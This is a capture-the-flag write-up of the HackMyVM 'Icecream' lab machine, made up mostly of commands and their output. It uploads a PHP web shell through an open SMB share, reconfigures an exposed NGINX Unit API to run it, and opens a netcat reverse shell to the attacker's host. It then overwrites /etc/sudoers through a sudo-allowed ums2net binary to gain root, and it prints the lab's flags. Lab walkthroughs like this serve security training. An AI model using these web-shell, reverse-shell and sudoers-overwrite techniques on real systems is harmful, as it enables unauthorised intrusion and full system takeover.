# CTF Penetration Testing

## HackMyVM

### Icecream - Machine

#### Machine Description

- Machine name: [Icecream](https://hackmyvm.eu/machines/machine.php?vm=Icecream)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟩 Easy

<img src="https://hackmyvm.eu/img/vm/icecream.png" alt="Icecream Machine Logo" width="150"/>

#### Tools Used

- crackmapexec (impacket)
- curl
- Gobuster
- Netcat
- Nmap
- pwncat-cs
- smbclient
- WhatWeb

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.137 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.137`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 09:54 CEST
Nmap scan report for 192.168.56.137
Host is up (0.0013s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp   open  http        nginx 1.22.1
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
9000/tcp open  cslistener?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9000-TCP:V=7.94SVN%I=7%D=10/10%Time=67078844%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,4A8,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Unit/1\.33\.0\r\
SF:nDate:\x20Thu,\x2010\x20Oct\x202024\x2007:54:43\x20GMT\r\nContent-Type:
SF:\x20application/json\r\nContent-Length:\x201042\r\nConnection:\x20close
SF:\r\n\r\n{\r\n\t\"certificates\":\x20{},\r\n\t\"js_modules\":\x20{},\r\n
SF:\t\"config\":\x20{\r\n\t\t\"listeners\":\x20{},\r\n\t\t\"routes\":\x20\
SF:[\],\r\n\t\t\"applications\":\x20{}\r\n\t},\r\n\r\n\t\"status\":\x20{\r
SF:\n\t\t\"modules\":\x20{\r\n\t\t\t\"python\":\x20{\r\n\t\t\t\t\"version\
SF:":\x20\"3\.11\.2\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/modules/pyth
SF:on3\.11\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"php\":\x20{\r\n\t\t\t\t\
SF:"version\":\x20\"8\.2\.18\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/mod
SF:ules/php\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"perl\":\x20{\r\n\t\t\t\
SF:t\"version\":\x20\"5\.36\.0\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/m
SF:odules/perl\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"ruby\":\x20{\r\n\t\t
SF:\t\t\"version\":\x20\"3\.1\.2\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit
SF:/modules/ruby\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"java\":\x20{\r\n\t
SF:\t\t\t\"version\":\x20\"17\.0\.11\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/
SF:unit/modules/java17\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"wasm\":\x20{
SF:\r\n\t\t\t\t\"version\":\x20\"0\.1\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib
SF:/unit/modules/wasm\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t")%r(HTTPOptions,
SF:C7,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nServer:\x20Unit/1\.
SF:33\.0\r\nDate:\x20Thu,\x2010\x20Oct\x202024\x2007:54:43\x20GMT\r\nConte
SF:nt-Type:\x20application/json\r\nContent-Length:\x2035\r\nConnection:\x2
SF:0close\r\n\r\n{\r\n\t\"error\":\x20\"Invalid\x20method\.\"\r\n}\r\n")%r
SF:(FourOhFourRequest,C3,"HTTP/1\.1\x20404\x20Not\x20Found\r\nServer:\x20U
SF:nit/1\.33\.0\r\nDate:\x20Thu,\x2010\x20Oct\x202024\x2007:54:43\x20GMT\r
SF:\nContent-Type:\x20application/json\r\nContent-Length:\x2040\r\nConnect
SF:ion:\x20close\r\n\r\n{\r\n\t\"error\":\x20\"Value\x20doesn't\x20exist\.
SF:\"\r\n}\r\n");
MAC Address: 08:00:27:13:83:82 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.98 seconds
```

`nmap -Pn -sSC -p80,139,445,9000 -T5 192.168.56.137`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 10:34 CEST
Nmap scan report for 192.168.56.137
Host is up (0.0032s latency).

PORT     STATE SERVICE
80/tcp   open  http
|_http-title: 403 Forbidden ←
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
9000/tcp open  cslistener
MAC Address: 08:00:27:13:83:82 (Oracle VirtualBox virtual NIC)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -2s
| smb2-time: 
|   date: 2024-10-10T08:34:08
|_  start_date: N/A
|_nbstat: NetBIOS name: ICECREAM, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Nmap done: 1 IP address (1 host up) scanned in 29.64 seconds
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[139,445 - Pentesting SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)

[**#List shared folders**]

It is always recommended to look if you can access to anything, if you don't have credentials try using **null** **credentials/guest user**.
```
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```

[**#Connect/List a shared folder**]
```
#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`smbclient --no-pass -L 192.168.56.137`:
```
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        icecream        Disk      tmp Folder
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
        nobody          Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 192.168.56.137 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

`crackmapexec smb 192.168.56.137 -u '' -p '' --shares`:
```
SMB         192.168.56.137  445    ICECREAM         [*] Windows 6.1 Build 0 (name:ICECREAM) (domain:ICECREAM) (signing:False) (SMBv1:False)
SMB         192.168.56.137  445    ICECREAM         [+] ICECREAM\: 
SMB         192.168.56.137  445    ICECREAM         [*] Enumerated shares
SMB         192.168.56.137  445    ICECREAM         Share           Permissions     Remark
SMB         192.168.56.137  445    ICECREAM         -----           -----------     ------
SMB         192.168.56.137  445    ICECREAM         print$                          Printer Drivers
SMB         192.168.56.137  445    ICECREAM         icecream        READ,WRITE      tmp Folder ←
SMB         192.168.56.137  445    ICECREAM         IPC$                            IPC Service (Samba 4.17.12-Debian)
SMB         192.168.56.137  445    ICECREAM         nobody                          Home Directories
```

`smbclient --no-pass //192.168.56.137/icecream`:
```
Try "help" to get a list of possible commands.
smb: \> ls ←
  .                                   D        0  Thu Oct 10 10:39:07 2024
  ..                                  D        0  Sun Oct  6 12:06:38 2024
  .font-unix                         DH        0  Thu Oct 10 09:51:33 2024
  systemd-private-0a4dc09c2a0547e7bdd9e1be48edb6d5-systemd-logind.service-qZJp45      D        0  Thu Oct 10 09:51:34 2024
  .XIM-unix                          DH        0  Thu Oct 10 09:51:33 2024
  .ICE-unix                          DH        0  Thu Oct 10 09:51:33 2024
  systemd-private-0a4dc09c2a0547e7bdd9e1be48edb6d5-systemd-timesyncd.service-BBJMfQ      D        0  Thu Oct 10 09:51:33 2024
  .X11-unix                          DH        0  Thu Oct 10 09:51:33 2024

                19480400 blocks of size 1024. 16136592 blocks available
```

`whatweb -a 3 http://192.168.56.137 -v`:
```
WhatWeb report for http://192.168.56.137
Status    : 403 Forbidden
Title     : 403 Forbidden
IP        : 192.168.56.137
Country   : RESERVED, ZZ

Summary   : HTTPServer[nginx/1.22.1], nginx[1.22.1]

Detected Plugins:
[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        String       : nginx/1.22.1 (from server string)

[ nginx ]
        Nginx (Engine-X) is a free, open-source, high-performance 
        HTTP server and reverse proxy, as well as an IMAP/POP3 
        proxy server. 

        Version      : 1.22.1
        Website     : http://nginx.net/

HTTP Headers:
        HTTP/1.1 403 Forbidden
        Server: nginx/1.22.1
        Date: Thu, 10 Oct 2024 08:42:27 GMT
        Content-Type: text/html
        Transfer-Encoding: chunked
        Connection: close
        Content-Encoding: gzip
```

`whatweb -a 3 http://192.168.56.137:9000 -v`:
```
WhatWeb report for http://192.168.56.137:9000
Status    : 200 OK
Title     : <None>
IP        : 192.168.56.137
Country   : RESERVED, ZZ

Summary   : HTTPServer[Unit/1.33.0]

Detected Plugins:
[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        String       : Unit/1.33.0 (from server string)

HTTP Headers:
        HTTP/1.1 200 OK
        Server: Unit/1.33.0 ←
        Date: Thu, 10 Oct 2024 08:42:23 GMT
        Content-Type: application/json
        Content-Length: 1042
        Connection: close
```

`curl -s http://192.168.56.137`:
```html
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.22.1</center>
</body>
</html>
```

`curl -s http://192.168.56.137:9000`:
```json
{
        "certificates": {},
        "js_modules": {},
        "config": {
                "listeners": {},
                "routes": [],
                "applications": {}
        },
        "status": {
                "modules": {
                        "python": {
                                "version": "3.11.2",
                                "lib": "/usr/lib/unit/modules/python3.11.unit.so"
                        },
                        "php": {
                                "version": "8.2.18",
                                "lib": "/usr/lib/unit/modules/php.unit.so"
                        },
                        "perl": {
                                "version": "5.36.0",
                                "lib": "/usr/lib/unit/modules/perl.unit.so"
                        },
                        "ruby": {
                                "version": "3.1.2",
                                "lib": "/usr/lib/unit/modules/ruby.unit.so"
                        },
                        "java": {
                                "version": "17.0.11",
                                "lib": "/usr/lib/unit/modules/java17.unit.so"
                        },
                        "wasm": {
                                "version": "0.1",
                                "lib": "/usr/lib/unit/modules/wasm.unit.so"
                        },
                        "wasm-wasi-component": {
                                "version": "0.1",
                                "lib": "/usr/lib/unit/modules/wasm_wasi_component.unit.so"
                        }
                },
                "connections": {
                        "accepted": 0,
                        "active": 0,
                        "idle": 0,
                        "closed": 0
                },
                "requests": {
                        "total": 0
                },
                "applications": {}
        }
}
```

`gobuster dir -u http://192.168.56.137:9000 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,jpg,txt,zip -t 15`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.137:9000
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   400,401,404,500
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,bak,jpg,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/status               (Status: 200) [Size: 862]
/config               (Status: 200) [Size: 62]
/certificates         (Status: 200) [Size: 4]

[...]
```

<div>
	<img src="./assets/logo_github.png" alt="GitHub Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>GitHub</strong></span>
</div>

[NGINX Unit](https://github.com/nginx/unit)

[**#Universal Web App Server**]

NGINX Unit is a lightweight and versatile open-source server that has two primary capabilities:
- serves static media assets,
- runs application code in eight languages.
Unit compresses several layers of the modern application stack into a potent, coherent solution with a focus on performance, low latency, and scalability. It is intended as a universal building block for any web architecture regardless of its complexity, from enterprise-scale deployments to your pet's homepage.
Its native [RESTful JSON API](https://github.com/nginx/unit#openapi-specification) enables dynamic updates with zero interruptions and flexible configuration, while its out-of-the-box productivity reliably scales to production-grade workloads. We achieve that with a complex, asynchronous, multithreading architecture comprising multiple processes to ensure security and robustness while getting the most out of today's computing platforms.

[**#Hello World with PHP and curl**]

Unit runs apps in a [variety of languages](https://unit.nginx.org/howto/samples/). Let's explore the configuration of a simple PHP app on Unit with `curl`.
Suppose you saved a PHP script as `/www/helloworld/index.php`:
```php
<?php echo "Hello, PHP on Unit!"; ?>
```
To run it on Unit with the `unit-php` module installed, first set up an application object. Let's store our first config snippet in a file called `config.json`:
```json
{
    "helloworld": {
        "type": "php",
        "root": "/www/helloworld/"
    }
}
```
Saving it as a file isn't necessary, but can come in handy with larger objects.
Now, `PUT` it into the `/config/applications` section of Unit's control API, usually available by default via a Unix domain socket:
```shell
curl -X PUT --data-binary @config.json --unix-socket  \
       /path/to/control.unit.sock http://localhost/config/applications
```
```json
{
	"success": "Reconfiguration done."
}
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`vim ./shell.php`:
```php
<?php system($_GET['cmd']); ?>
```

`smbclient --no-pass //192.168.56.137/icecream`:
```
Try "help" to get a list of possible commands.
smb: \> put shell.php ←
putting file shell.php as \shell.php (6.2 kb/s) (average 3.5 kb/s)
```

`vim ./app.json`:
```json
{
    "type": "php",
    "processes": 1,
    "root": "/tmp", ←
    "index": "shell.php" ←
}
```

`curl -X PUT -d @app.json --header "Content-Type: application/json" http://192.168.56.137:9000/config/applications/myapp`:
```json
{
        "success": "Reconfiguration done."
}
```

`vim ./listener.json`:
```json
{
    "pass": "applications/myapp" ←
}
```

`curl -X PUT -d @listener.json --header "Content-Type: application/json" http://192.168.56.137:9000/config/listeners/*:9999`:
```json
{
        "success": "Reconfiguration done."
}
```

`curl "http://192.168.56.137:9999/?cmd=id"`:
```
uid=1000(ice) gid=1000(ice) grupos=1000(ice),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth) ←
```

`curl "http://192.168.56.137:9999/?cmd=which%20nc"`:
```
/usr/bin/nc ←
```

`pwncat-cs -lp 4444`:
```
[13:13:13] Welcome to pwncat 🐈!
bound to 0.0.0.0:4444 ←
```

```
cmd='nc -e /bin/bash 192.168.56.118 4444'; \
encoded_cmd=$(printf %s "$cmd" | jq -s -R -r @uri); \
curl "http://192.168.56.137:9999/?cmd=$encoded_cmd";
```

```
[13:40:40] received connection from 192.168.56.137:58474 ←
[13:40:41] 192.168.56.135:58474: registered new host w/ db
```

![Victim: ice](https://img.shields.io/badge/Victim-ice-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
ice ←
```

`id`:
```
uid=1000(ice) gid=1000(ice) grupos=1000(ice),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth)
```

`uname -a`:
```
Linux icecream 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64 GNU/Linux
```

`lsb_release -a`:
```
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 12 (bookworm)
Release:        12
Codename:       bookworm
```

`cd /home/ice`

`ls -alps ./`:
```
total 28
4 drwx------ 3 ice  ice  4096 oct  6 12:24 ./
4 drwxr-xr-x 3 root root 4096 oct  6 12:10 ../
0 lrwxrwxrwx 1 ice  ice     9 oct  6 12:14 .bash_history -> /dev/null
4 -rw-r--r-- 1 ice  ice   220 oct  6 12:10 .bash_logout
4 -rw-r--r-- 1 ice  ice  3526 oct  6 12:10 .bashrc
4 drwxr-xr-x 3 ice  ice  4096 oct  6 12:24 .local/
4 -rw-r--r-- 1 ice  ice   807 oct  6 12:10 .profile
4 -rw------- 1 ice  ice    18 oct  6 12:24 user.txt ←
```

`cat ./user.txt`:
```
HMVaneraseroflove ←
```

`sudo -l`:
```
Matching Defaults entries for ice on icecream:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ice may run the following commands on icecream:
    (ALL) NOPASSWD: /usr/sbin/ums2net ←
```

`file /usr/sbin/ums2net`:
```
/usr/sbin/ums2net: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=65d9e04c126a125d608b4b1f4510d0e6975f13a0, for GNU/Linux 3.2.0, stripped
```

<div>
	<img src="./assets/logo_github.png" alt="GitHub Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>GitHub</strong></span>
</div>

[USB Mass Storage to Network Proxy (ums2net)](https://github.com/grandpaul/ums2net)

[**#How to use ums2net**]

1. Insert the USB Mass Storage. Check /dev/disk/by-id/ for the unique path for that device.
2. Create a config file base on the above path. Please see the config file format section.
3. Run "ums2net -c ". ums2net will become a daemon in the background. For debugging please add "-d" option to avoid detach.
4. Use nc to write your image to the USB Mass Storage device. For example, "nc -N localhost 29543 < warp7.img".

[**#Config file**]

Each line in the config file maps a TCP port to a device. All the options are separated by space. The first argument is a number represents the TCP port. And the rest of the arguments are in dd-style. For example, a line in the config file:
```
"29543 of=/dev/disk/by-id/usb-Linux_UMS_disk_0_WaRP7-0x2c98b953000003b5-0:0 bs=4096"
```
It means TCP port 29543 is mapped to /dev/disk/by-id/usb-Linux_UMS_disk_0_WaRP7-0x2c98b953000003b5-0:0 and the block size is 4096.
Currently we only support "of" and "bs".

![Victim: ice](https://img.shields.io/badge/Victim-ice-64b5f6?logo=linux&logoColor=white)

<❌ Failed Step.>

`ls -alps /dev/disk/by-id`:
```
total 0
0 drwxr-xr-x 2 root root 140 oct 10 09:51 ./
0 drwxr-xr-x 7 root root 140 oct 10 09:51 ../
0 lrwxrwxrwx 1 root root   9 oct 10 09:51 ata-VBOX_CD-ROM_VB2-01700376 -> ../../sr0
0 lrwxrwxrwx 1 root root   9 oct 10 09:51 ata-VBOX_HARDDISK_VB0d0bf3c8-2442609b -> ../../sda
0 lrwxrwxrwx 1 root root  10 oct 10 09:51 ata-VBOX_HARDDISK_VB0d0bf3c8-2442609b-part1 -> ../../sda1
0 lrwxrwxrwx 1 root root  10 oct 10 09:51 ata-VBOX_HARDDISK_VB0d0bf3c8-2442609b-part2 -> ../../sda2
0 lrwxrwxrwx 1 root root  10 oct 10 09:51 ata-VBOX_HARDDISK_VB0d0bf3c8-2442609b-part5 -> ../../sda5
```

`df /`:
```
S.ficheros     bloques de 1K  Usados Disponibles Uso% Montado en
/dev/sda1           19480400 2328956    16136560  13% / ←
```

`echo "5555 of=/dev/disk/by-id/ata-VBOX_HARDDISK_VB0d0bf3c8-2442609b-part1/root/.ssh/authorized_keys bs=4096" | tee ./config`:
```
5555 of=/dev/disk/by-id/ata-VBOX_HARDDISK_VB0d0bf3c8-2442609b-part1/etc/sudoers bs=4096
```

`sudo /usr/sbin/ums2net -c ./config -d &`

`ss -tnlp '( sport = :5555 )'`:
```
State                 Recv-Q                Send-Q                               Local Address:Port                                  Peer Address:Port                Process                
LISTEN                0                     10                                               *:5555 ←                                          *:*
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`nmap -Pn -sSVC -p5555 -T5 192.168.56.137`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 12:43 CEST
Nmap scan report for 192.168.56.137
Host is up (0.0017s latency).

PORT      STATE SERVICE    VERSION
5555/tcp open  tcpwrapped ←
MAC Address: 08:00:27:13:83:82 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.69 seconds
```

`echo -e "ice\tALL=(ALL) NOPASSWD: ALL" | tee ./fake_sudoers`:
```
ice     ALL=(ALL) NOPASSWD: ALL
```

`nc 192.168.56.137 5555 < ./fake_sudoers -q 0`

![Victim: ice](https://img.shields.io/badge/Victim-ice-64b5f6?logo=linux&logoColor=white)

```
ums2net[2310]: Device /dev/disk/by-id/ata-VBOX_HARDDISK_VB0d0bf3c8-2442609b-part1/etc/sudoers not appeared. Close immediately. ←
```

</❌ Failed Step.>

![Victim: ice](https://img.shields.io/badge/Victim-ice-64b5f6?logo=linux&logoColor=white)

`echo "6666 of=/etc/sudoers bs=4096" | tee ./config`:
```
6666 of=/etc/sudoers bs=4096
```

`sudo /usr/sbin/ums2net -c ./config -d`:
```
/etc/sudoers:2:10: error de sintaxis
with the 'visudo' command as root.
         ^~~~~~~~
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`nc 192.168.56.137 6666 < ./fake_sudoers -q 0`

![Victim: ice](https://img.shields.io/badge/Victim-ice-64b5f6?logo=linux&logoColor=white)

```
ums2net[656]: Totally write 28 bytes to /etc/sudoers ←
```

`sudo bash`

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
root ←
```

`id`:
```
uid=0(root) gid=0(root) groups=0(root) ←
```

`cd /root`

`ls -alps`:
```
total 32
4 drwx------  4 root root 4096 oct  6 12:24 ./
4 drwxr-xr-x 18 root root 4096 oct  6 12:06 ../
0 lrwxrwxrwx  1 root root    9 oct  6 12:13 .bash_history -> /dev/null
4 -rw-r--r--  1 root root  571 abr 10  2021 .bashrc
4 drwxr-xr-x  3 root root 4096 oct  6 12:15 .local/
4 -rw-r--r--  1 root root  161 jul  9  2019 .profile
4 -rw-------  1 root root   15 oct  6 12:24 root.txt ←
4 -rw-r--r--  1 root root   66 oct  6 12:21 .selected_editor
4 drwx------  2 root root 4096 oct  6 12:03 .ssh/
```

`cat ./root.txt`:
```
HMViminvisible ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
